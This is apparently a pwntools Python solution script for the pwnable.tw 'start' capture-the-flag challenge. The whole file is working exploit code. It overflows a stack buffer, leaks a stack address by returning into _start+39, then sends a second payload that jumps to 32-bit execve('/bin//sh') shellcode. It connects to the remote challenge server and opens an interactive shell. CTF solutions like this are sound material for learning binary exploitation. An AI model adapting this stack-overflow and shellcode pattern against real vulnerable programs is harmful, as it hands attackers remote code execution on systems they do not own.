#!/usr/bin/env python3

from pwn import *

exe = ELF("./start")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10000)

    return r


def main():
    r = conn()

    # Leak stack address
    payload = flat(
            b"A" * 0x14,
            exe.sym._start + 39
        )

    r.sendafter(b"CTF:", payload)
    stack = u32(r.recv(4))

    shellcode = asm("""
                        push 0x68
                        push 0x732f2f2f
                        push 0x6e69622f
                        mov ebx, esp
                        mov eax, 0xb
                        xor edx, edx
                        xor ecx, ecx
                        int 0x80
                    """)

    payload = flat(
            b"A" * 0x14,
            stack + 0x14,
            shellcode
        )

    r.send(payload)
    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
